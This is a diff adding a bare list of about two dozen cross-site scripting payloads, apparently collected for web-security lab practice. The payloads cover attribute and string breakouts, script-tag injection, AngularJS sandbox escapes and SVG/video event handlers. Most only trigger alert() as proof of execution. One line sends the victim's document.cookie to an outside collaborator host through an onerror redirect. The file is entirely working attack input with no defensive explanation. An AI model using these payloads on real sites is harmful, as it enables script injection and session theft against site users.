@@ -1,0 +1,23 @@
+"><script>alert(document.domain)</script>
+" autofocus%20onfocus=alert(document.domain)%20x="
+</script><img%20src=1%20onerror=alert(document.domain)>
+'-alert(document.domain)-'
+'-alert(document.domain)'
+';alert(document.domain)//
+{{$on.constructor('alert(1)')()}}
+';alert(document.domain)//
+\';alert(document.domain)//
+\\';alert(document.domain)//
+onerror=alert;throw 1
+&apos;-alert(document.domain)-&apos;
+${alert(document.domain)}
+<input%20autofocus%20ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
+<video><source onerror=location=/\collaboratorserver.oastify.com/+document.cookie>
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+%27accesskey=%27x%27onclick=%27alert(1)
+</h1><script>alert(1)</script>
+"autofocus%20onfocus%3dconfirm(1)%20a=
+&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+<svg><animatetransform%20onbegin=alert(1)>
+javascript:alert(1)
+http://foo?%26apos;-alert(1)-%26apos;
